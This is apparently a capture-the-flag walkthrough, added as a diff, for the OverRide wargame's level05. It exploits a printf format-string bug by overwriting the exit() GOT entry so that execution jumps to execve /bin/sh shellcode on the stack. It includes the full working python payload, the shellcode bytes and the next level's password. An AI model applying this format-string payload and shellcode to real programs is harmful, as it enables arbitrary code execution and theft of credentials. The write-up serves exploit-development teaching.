@@ -1,0 +1,60 @@
+Small program, and we see an obvious unsafe call to printf(user_input).
+
+exit() being called right after printf() in the program, we can overflow the GOT entry for exit()
+
+We find the address we need to overwrite :
+
+objdump --dynamic-reloc ./level05
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+080497c4 R_386_GLOB_DAT    __gmon_start__
+080497f0 R_386_COPY        stdin@@GLIBC_2.0
+080497d4 R_386_JUMP_SLOT   printf@GLIBC_2.0
+080497d8 R_386_JUMP_SLOT   fgets@GLIBC_2.0
+080497dc R_386_JUMP_SLOT   __gmon_start__
+080497e0 R_386_JUMP_SLOT   exit@GLIBC_2.0			--> that's the one ! 0x080497e0
+080497e4 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
+
+We put this address on the stack to write to it with %n :
+python -c 'print "\xe0\x97\x04\x08" + "%10$p"' | ./level05
+�0x80497e0
+
+Let's redirect the execution to a shellcode we put on the stack instead of exit() !
+
+Let's start by knowing where the stack pointer is when we redirect execution somewhere else than exit().
+
+We only need to put any value at 0x80497e0 to get the segfault :
+level05@OverRide:~$ python -c 'print "\xe0\x97\x04\x08" + "%01000x" + "%10$hn"' | ./level05
+0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000064
+Segmentation fault (core dumped)
+
+Thanks to this segfault, we can now query the kernel ring buffer with dmesg, to get the stack pointer address after code redirection.
+level05@OverRide:~$ dmesg | tail -n 1
+[ 3461.145601] level05[2014]: segfault at 80403ec ip 00000000080403ec sp 00000000ffffd66c error 14 in level05[8048000+1000]
+
+Now that we have the fixed stack pointer (0xffffd66c), we only need to add 0x28 to the address to get the beginning of our buffer --> 0xffffd694
+
+Now, let's look for a short shellcode that doesn't contain any bytes between 0x41 and 0x5a, as those bytes would automatically get modified by the program.
+
+Found one ! http://shell-storm.org/shellcode/files/shellcode-585.php
+
+"\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" (25 bytes)
+
+It launches "/bin/sh" with execve()
+
+To get the precise address of the shellcode, we need to add an offset of 46 to 0xffffd694 (as in the buffer, before the shellcode there's other stuff) --> 0xffffd6c2
+
+Let's split that number up in 2 so that we don't need to write that many bytes to stdout.
+(gdb) p/d 0xffff    
+$6 = 65535
+(gdb) p/d 0xd6c2    
+$7 = 54978
+Our final payload will look like this :
+
+[GOT address of exit() 4 bytes] + [GOT address of exit() + 2 (4 bytes)] + [printf padding to reach 54978 bytes printed] + [%10$hn to write 0xd6c2 at exit()] + [printf padding to reach 65535 bytes printed] + [%11$hn to write 0xffff at exit()+2] + [NOP sled \x90 (12 bytes)] + [shellcode (25 bytes) + null byte to end "/bin/sh" because fgets() accepts null bytes >:D]
+
+(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%054970x" + "%10$hn" + "%010557x" + "%11$hn" + "\x90" * 30 + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"'; cat) | ./level05
+
+cat /home/users/level06/.pass 
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
